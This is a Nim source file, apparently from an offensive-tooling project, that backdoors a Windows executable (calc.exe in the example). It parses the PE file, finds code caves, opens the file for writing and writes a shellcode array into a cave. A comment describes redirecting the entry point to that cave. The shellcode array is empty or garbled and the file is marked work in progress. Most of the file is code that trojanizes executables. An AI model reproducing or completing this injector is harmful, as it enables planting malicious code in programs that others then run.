import ptr_math, winim, cligen, ../../General/PeParsing/Parser, ../../General/MemoryScanning/CodeCaves

var shellcode: array[276, byte] = [
byte ,  ]

var shellcodeSize = sizeof(shellcode)
var targetPe = "calc.exe" # example
var peFile = parsePe(targetPe)

var hPe: HANDLE = CreateFileA(targetPe, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))

var peEntryPoint = peFile.Headers.OptHeader.AddressOfEntryPoint

var foundCaves = findCaves(peFile, shellcodeSize)

var targetCave = foundCaves[1]

# goal -> move file ptr to raw addr of cave -> write to that the shellcode -> write to the EP the raw addr of cave (which now contains our shellcode)
echo(targetCave.SectionName)
echo(repr(targetCave.RawAddress))
echo($targetCave.Size)

if SetFilePointer(hPe, cast[DWORD](targetCave.RawAddress), NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER:
    echo("Failed To Set File Pointer to Code Cave Raw Address.")


var resultWrite = WriteFile(
    hPe,
    &shellcode[0],
    DWORD(shellcodeSize),
    NULL,
    NULL
)

echo $peEntryPoint
if resultWrite == FALSE:
    echo("Failed To Write Shellcode To Cave!")


# WORK IN PROGRESS #


